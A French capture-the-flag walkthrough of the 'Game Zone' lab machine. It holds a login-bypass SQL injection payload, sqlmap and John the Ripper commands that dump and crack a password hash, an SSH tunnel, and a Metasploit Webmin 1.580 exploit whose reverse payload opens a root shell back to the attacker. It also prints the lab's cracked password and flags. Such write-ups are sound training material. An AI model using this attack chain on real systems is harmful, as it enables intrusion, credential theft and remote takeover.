Game Zone

SQLiSQLmapJohn SSH TunnelMetasploitWebmin

Exploiter une vulnérabilité SQLi pour obtenir des mots de passe, les craquer avec John et obtenir un accès distant via SSH. Ensuite, exposition de services internes par tunnel SSH et escalade via Metasploit sur Webmin 1.580 vulnérable.

Objectif

Compromettre la machine en exploitant une injection SQL, récupérer puis cracker un hash, puis faire une escalade de privilèges via une version vulnérable de Webmin.

Task 1 — Deploy

Lancer la machine vulnérable pour obtenir une adresse IP, puis se rendre sur http://machine_ip.

Task 2 — SQLi : Bypass Auth

La page d'accueil présente un formulaire de connexion. On peut se connecter sans mot de passe avec le payload suivant dans le champ username :

sql 
' OR 1=1-- -

L'application est vulnérable à une SQLi. On est redirigé vers portal.php.

Task 3 — SQLmap

On intercepte la requête POST sur portal.php via Burp Suite et on la copie dans request.txt :

request.txt
POST /portal.php HTTP/1.1
Host: lab.thm
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=...

searchitem=test
bash 
sqlmap -r request.txt --dbms=mysql --dump

On récupère depuis la table users :

output 
username : agent47
hash     : ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

Task 4 — John The Ripper

On copie le hash dans hash.txt et on détecte le format SHA-256 :

bash 
john --format=Raw-SHA256 \
  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Mot de passe cracké : videogamer124

On se connecte en SSH :

bash 
ssh agent47@lab.thm
User flag : 649ac17b1480ac13ef1e4fa579dac95c

Task 5 — Tunnel SSH

On détecte 5 sockets TCP ouverts. Le port 10000 tourne en interne (Webmin). On crée un tunnel SSH :

bash 
ssh -L 10000:localhost:10000 agent47@lab.thm

On accède à http://localhost:10000 — CMS Webmin 1.580 détecté.

Task 6 — Privilege Escalation (Metasploit)

Webmin 1.580 est vulnérable à une RCE authentifiée. On exploite via Metasploit :

bash — msfconsole
msf > search webmin 1.580
msf > use unix/webapp/webmin_show_cgi_exec
msf > set username agent47
msf > set password videogamer124
msf > set payload cmd/unix/reverse
msf > set rhosts 127.0.0.1
msf > set lhost <votre_ip>
msf > set ssl false
msf > run

On obtient un shell root. On stabilise et récupère le flag :

bash 
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /root/root.txt
Root flag : a4b945830144bdd71908d12d902adeee

Leçons apprises

  • Détecter manuellement les SQLi (bypass auth) et automatiser avec SQLmap
  • Port forwarding SSH pour exposer des services internes
  • Ne jamais laisser tourner des CMS vulnérables (Webmin) sans MAJ
